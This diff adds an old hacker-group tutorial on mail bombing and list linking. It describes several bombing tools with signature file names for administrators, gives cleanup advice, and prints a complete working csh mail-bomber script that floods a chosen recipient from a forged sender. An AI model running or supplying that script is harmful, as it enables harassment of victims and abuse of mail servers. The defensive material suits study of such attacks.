@@ -1,0 +1,202 @@
+=============================
+Mail Bombing and List Linking
+=============================
+by Tolda [2000]
+With comments and additions by R a v e N.
+Written for BSRF.
+Homepage: http://blacksun.box.sk
+
+ Important Note
+ ==============
+ The writers of this article nor BSRF believe that mail bombing and
+ list linking are against the law, and should not be carried out nor
+ tolerated by anyone. In fact, these are two of the dumbest things you
+ could do on the net, and will only get you mocked. Such attacks are
+ only carried out by kids with too much time in their hands, who are
+ not smart enough to carry out more sophisticated attacks.
+
+ Know Your Enemy
+ ===============
+
+ Up Yours:
+ 
+ The Up Yours mail-bombing program is probably the most popular bomber 
+ out there. It uses minimal resources, does a superb job, has a simple 
+ user interface, and attempts to obscure the attacker's source 
+ address. Features of the program include being able to specify times 
+ of day to start and stop as well as the number of messages with which 
+ it will hammer the target.
+ 
+ This bomber runs only on the Microsoft Windows platform. If you are a 
+ system administrator, you will want to scan your local drives for the 
+ following files:
+ 
+ upyours.exe
+ upyours2.zip
+ upyours3.zip
+ 
+ If these files appear in a user's directory, there is a strong 
+ likelihood that he is about to e-mail bomb someone (of course, 
+ perhaps he simply spends his time collecting hacking and cracking 
+ programs). In any event, the utility is hard to find. If one of your 
+ users has acquired this program, he clearly has an interest in 
+ hacking or cracking :o)
+ 
+ KaBoom:
+ 
+ KaBoom differs significantly from Up Yours. In the main program, you 
+ find a utility to list link. Using this function, you can subscribe 
+ your target to hundreds of e-mail lists. When I say that a target has 
+ been list-linked, I mean the target has been subscribed (without his 
+ consent) to one or more mailing lists. Such tools submit registration 
+ requests on behalf of the victim, forging his e-mail address. In any 
+ event, this utility's signature files are these:
+ 
+ kaboom!3.zip
+ kaboom3.exe
+ 
+ Avalanche:
+ 
+ The Avalanche e-mail bombing utility works smoothly and is well 
+ designed. The list groups are displayed in a drop-down combo box, and 
+ their individual lists are displayed in a list box. Three clicks of a 
+ mouse and your target is in hot water.
+ 
+ TIP: The programmer here was a bit absentminded. The program was 
+ written at least in part in Microsoft Visual Basic 4.0. As such, 
+ there are a series of DLL files that are required to run the 
+ application. These are missing from the general distribution of this 
+ utility; therefore, serious bombers must go out onto the Internet to 
+ retrieve those files (one is OC2.DLL). Because of this, I would 
+ estimate that Avalanche is probably used less than its counterparts, 
+ even though its overall design is superior. Inconvenience discourages 
+ most users of this particular ilk. The signature files for this 
+ product are:
+ 
+ alanch10.zip
+ avalanche20.zip
+ avalanche.exe
+ 
+ Unabomber:
+ 
+ The Unabomber utility is a rudimentary tool, but one must give the 
+ author credit for humor. Unabomber offers no list-linking 
+ capabilities. It is essentially a flat e-mail bomber and does no more 
+ than send messages over and over. One interesting element is that 
+ Unabomber comes with a help function. The signature files for this 
+ utility are:
+ 
+ unabomb.zip
+ unabomb.exe
+ 
+ eXtreme Mail:
+ 
+ eXtreme Mail is well programmed. It includes an interactive 
+ installation process that performs all the routine checks for disk 
+ space, resources, and so forth. It also observes proper registry 
+ conventions and is easily uninstalled.
+ The signature files for this product are:
+ 
+ xmailb1.zip
+ xmailb1.exe
+ 
+ Homicide:
+ 
+ The Homicide utility was written by a youngster with the moniker Frys 
+ and was discontinued in 1996. The author claims that he wrote the 
+ utility because Up Yours 2.0 was inadequate as an e-mail bombing 
+ tool. However, with the release of Up Yours 3.0, Frys apparently 
+ decided to discontinue any further releases. As of March 1997, it is 
+ available only at a very few select sites. 
+ The signature files for this utility are:
+ 
+ homicide.zip
+ homicide.exe
+ 
+ The UNIX MailBomb:
+ 
+ This UNIX e-mail bomber is reportedly written by CyberGoat, an 
+ anonymous cracker out in the void. The signature file on this one is 
+ mailbomb.csh.
+ It is in fact a CSH shell script and not a program, since Unix has
+ such powerful shells and shell scripting capabilities. It's main
+ advantage is that it is very small in size.
+ 
+ #!/bin/csh
+ # Anonymous Mailbomber
+ # do chmod u+rwx <filename> where filename is the name of the file 
+ that
+ # you saved it as.
+ #*** WARNING - THIS WILL CREATE AND DELETE A TEMP FILE CALLED
+ # "teltemp"
+ # IN THE DIRECTORY IT IS RUN FROM ****
+ clear
+ echo -n "What is the name or address of the smtp server ?"
+ set server = $<
+ #echo open $server 25 > teltemp
+ echo quote helo somewhere.com >> teltemp
+ #The entry for the following should be a single name (goober),
+ #not goober@internet.address <mailto:goober@internet.address>.
+ echo -n "Who will this be from (e.g. somebody) ?"
+ set from = $<
+ echo quote mail from: $from >> teltemp
+ echo -n "Who is the lucky recipient (e.g. someone@somewhere) ? "
+ set name = $<
+ echo quote rcpt to: $name >> teltemp
+ echo quote data >> teltemp
+ echo quote . >> teltemp
+ echo quote quit >> teltemp
+ echo quit >> teltemp
+ echo -n "How many times should it be sent ?"
+ set amount = $<
+ set loop_count = 1
+ while ($loop_count <= $amount)
+ echo "Done $loop_count"
+ ftp -n $server 25 < teltemp
+ @ loop_count++
+ end
+ rm ./teltemp
+ echo $amount e-mails complete to $name from $from@$server
+ # --------------------
+ # MailBomb by CyBerGoAT
+ 
+ Bombtrack:
+ 
+ The Bombtrack utility is reportedly the first mail-bombing tool 
+ written for the Macintosh platform. It is another run-of-the-mill 
+ bombing utility, widely available at cracker sites across the 
+ Internet. The signature file for this application is:
+ 
+ bombtrack.bin
+ 
+ FlameThrower:
+ 
+ FlameThrower is a bombing utility written for Macintosh. Its main 
+ purpose is list linking; it allows the user to subscribe his target 
+ to 100 lists. The binary is quite large, considering its intended 
+ purpose. The signature for this file is:
+ 
+ flamethrower10b.sit.bin
+
+
+
+ Mail Bombing Countermeasures
+ ============================
+ There are many utilities out there (such as pop3free, pop3clean
+ etc') that will clean up POP3 mail accounts. To learn more about
+ POP3, refer to BSRF's POP3 tutorial.
+ As for web-based mail accounts, you can always save any real mails
+ that you got and delete all the rest (any web-based mail account
+ should have such a feature).
+ To report such attacks, send a message to your abuse team (for
+ example: if you have an account at hotmail.com, send your mail to
+ abuse@hotmail.com).
+
+ As for list linking, if you're facing a large attack and cannot
+ unsubscribe from all of the mailing list by yourself, consider
+ switching to another account. Sorry, there's no other way.
+
+
+ Question? Comments?
+ Post them to BSRF's message board at blacksun.box.sk.
+ Thanks for reading!
